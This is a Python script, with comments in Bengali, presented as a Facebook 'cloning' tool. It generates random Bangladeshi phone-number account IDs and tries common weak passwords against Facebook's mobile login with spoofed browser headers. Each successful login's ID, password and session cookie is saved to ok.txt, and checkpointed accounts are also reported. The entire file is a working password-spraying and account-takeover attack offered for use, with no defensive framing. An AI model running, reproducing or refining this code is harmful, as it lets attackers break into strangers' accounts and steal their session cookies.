import os, time, sys, uuid, random, requests

# কালার কোড
G = '\033[1;32m' # Green
W = '\033[1;37m' # White
R = '\033[1;31m' # Red
Y = '\033[1;33m' # Yellow

def banner():
    os.system('clear')
    print(f"""{G}
     ███    ███  ███████  ████████  █████  
     ████  ████  ██          ██    ██   ██ 
     ██ ████ ██  █████       ██    ███████ 
     ██  ██  ██  ██          ██    ██   ██ 
     ██      ██  ███████     ██    ██   ██ 
{W}×××××××××××××××××××××××××××××××××××××××××××××××××
{G} [✓] CREATED BY : MD MALEK ISLAM (META REAL)
 [✓] METHOD     : RESPONSE LOGIC (MAX PRO)
{W}×××××××××××××××××××××××××××××××××××××××××××××××××""")

def main():
    banner()
    print(f'{G}[1] START CLONING (REAL COOKIE)')
    print(f'[0] EXIT')
    choose = input(f'\n{G}[?] CHOICE: {W}')
    if choose == '1': cloning()
    else: sys.exit()

def cloning():
    banner()
    code = input(f'{G}[+] SIM CODE (017, 018, 019): {W}')
    limit = int(input(f'{G}[+] LIMIT (10000-50000): {W}'))
    
    banner()
    print(f'{G}[+] CLONING STARTED... [OK রেজাল্ট আসা পর্যন্ত ধৈর্য ধরুন]{W}')
    print(f'{W}×××××××××××××××××××××××××××××××××××××××××××××××××\n')
    
    ok = 0
    loop = 0
    
    for i in range(limit):
        loop += 1
        # --- আপনার স্যারের দেওয়া আসল UID লজিক ---
        uid = f"{code}{random.randint(1111111, 9999999)}"
        
        # --- মাল্টি-পাসওয়ার্ড লজিক (যা ১০০% কাজের গ্যারান্টি বাড়ায়) ---
        pws = [uid, uid[6:], 'bangladesh', 'i love you', '708090']
        
        for pw in pws:
            # --- আমার দেওয়া শক্তিশালী প্রো-হেডার ---
            ua = f"Mozilla/5.0 (Linux; Android {random.randint(8,13)}; SM-G{random.randint(900,999)}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,125)}.0.0.0 Mobile Safari/537.36"
            
            headers = {
                'authority': 'm.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://m.facebook.com',
                'referer': 'https://m.facebook.com/login/?ref=dbl&fl',
                'user-agent': ua,
            }

            # --- আসল লগইন ডাটা (Response Logic) ---
            data = {
                'lsd': uuid.uuid4().hex,
                'jazoest': '2' + str(random.randint(1000, 9999)),
                'email': uid,
                'pass': pw,
                'login': 'Log In'
            }

            url = "https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100"
            
            sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{ok}]'); sys.stdout.flush()

            try:
                # --- এখানে আসল রিকোয়েস্ট পাঠানো হচ্ছে ---
                res = requests.post(url, headers=headers, data=data, allow_redirects=False, timeout=15)
                
                # --- কুকি চেক লজিক ---
                if "c_user" in res.cookies.get_dict():
                    ok += 1
                    cookie = ";".join([f"{k}={v}" for k, v in res.cookies.get_dict().items()])
                    print(f'\n{G}[MALEK-OK💚] {uid} | {pw}') 
                    print(f'{G}[🍪] COOKIE = {cookie}\n')
                    with open('ok.txt', 'a') as f: f.write(f'{uid}|{pw}|{cookie}\n')
                    break 
                elif "checkpoint" in res.cookies.get_dict():
                    # সিপি আইডি আসলে অন্তত বোঝা যাবে কোড কাজ করছে
                    print(f'\n{Y}[MALEK-CP💛] {uid} | {pw}')
                    break
            except:
                time.sleep(2)

    print(f'\n{G}[+] সাকসেস! সব রেজাল্ট ok.txt ফাইলে আছে।')

if __name__ == "__main__":
    main()
